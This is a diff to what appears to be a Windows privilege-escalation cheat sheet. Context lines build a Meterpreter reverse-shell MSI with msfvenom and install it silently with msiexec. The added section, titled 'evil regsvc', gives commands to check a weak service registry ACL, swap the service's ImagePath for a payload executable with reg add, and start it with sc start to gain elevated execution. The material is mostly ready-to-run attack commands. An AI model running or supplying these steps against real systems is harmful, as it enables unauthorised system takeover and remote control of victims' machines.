@@ -508,3 +508,16 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f msi -o ba
 3. Execute your msi payload
 msiexec /quiet /qn /i C:\Temp\badsetup.msi
 ```
+
+### [Creating an evil regsvc]
+1. Confirm vulnerable regkey by checking Privilges of regsvc. (“NT AUTHORITY\INTERACTIVE” “FullContol”)  
+Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+
+2. Compiling your C program  
+https://github.com/sagishahar/scripts/blob/master/windows_service.c  
+
+3. Transfer your payload to your windows box  
+
+4. Executing your payload  
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\service.exe /f  
+sc start regsvc  
